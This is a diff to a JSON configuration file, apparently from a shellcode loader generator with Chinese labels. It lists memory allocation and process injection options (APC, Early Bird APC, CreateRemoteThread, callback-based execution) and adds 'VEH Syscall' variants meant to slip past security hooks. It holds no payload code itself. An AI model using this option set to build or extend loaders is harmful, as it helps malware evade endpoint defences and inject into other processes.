@@ -12,12 +12,14 @@
   "alloc_mem_modes": [
     { "id": "alloc_mem_va", "label": "VirtualAlloc", "feature": "alloc_mem_va" },
     { "id": "alloc_mem_syscall", "label": "NtAllocateVirtualMemory (Syscall)", "feature": "alloc_mem_syscall" },
+    { "id": "alloc_mem_veh_syscall", "label": "NtAllocateVirtualMemory (VEH Syscall)", "feature": "alloc_mem_veh_syscall" },
     { "id": "alloc_mem_global", "label": "GlobalAlloc", "feature": "alloc_mem_global" },
     { "id": "alloc_mem_local", "label": "LocalAlloc", "feature": "alloc_mem_local" },
     { "id": "alloc_mem_heap", "label": "HeapAlloc", "feature": "alloc_mem_heap" },
     { "id": "alloc_mem_mapview", "label": "MapViewOfFile", "feature": "alloc_mem_mapview" },
     { "id": "alloc_mem_section", "label": "NtMapViewOfSection", "feature": "alloc_mem_section" },
     { "id": "alloc_mem_section_syscall", "label": "NtMapViewOfSection (Syscall)", "feature": "alloc_mem_section_syscall" },
+    { "id": "alloc_mem_section_veh_syscall", "label": "NtMapViewOfSection (VEH Syscall)", "feature": "alloc_mem_section_veh_syscall" },
     { "id": "alloc_mem_sh_alloc", "label": "SHAlloc", "feature": "alloc_mem_sh_alloc" },
     { "id": "alloc_mem_snmp_util", "label": "SnmpUtilMemAlloc", "feature": "alloc_mem_snmp_util" },
     { "id": "alloc_mem_va_from_app", "label": "VirtualAllocFromApp", "feature": "alloc_mem_va_from_app" }
@@ -37,7 +39,9 @@
     { "id": "fls_alloc", "label": "FLS Alloc 注入 (fls_alloc)", "feature": "run_fls_alloc", "pattern": 1 },
     { "id": "linedda", "label": "LineDDA 注入 (linedda)", "feature": "run_linedda", "pattern": 1 },
     { "id": "syscall", "label": "NtCreateThreadEx (Syscall)", "feature": "run_syscall", "pattern": 1 },
+    { "id": "veh_syscall", "label": "NtCreateThreadEx (VEH Syscall)", "feature": "run_veh_syscall", "pattern": 1 },
     { "id": "apc_syscall", "label": "APC 注入 (Syscall)", "feature": "run_apc_syscall", "pattern": 1 },
+    { "id": "apc_veh_syscall", "label": "APC 注入 (VEH Syscall)", "feature": "run_apc_veh_syscall", "pattern": 1 },
     { "id": "early_bird_apc", "label": "Early Bird APC 注入 (early_bird_apc)", "feature": "run_early_bird_apc", "pattern": 2 },
     { "id": "create_remote_thread", "label": "CreateRemoteThread 远程注入 (create_remote_thread)", "feature": "run_create_remote_thread", "pattern": 3 }
   ],
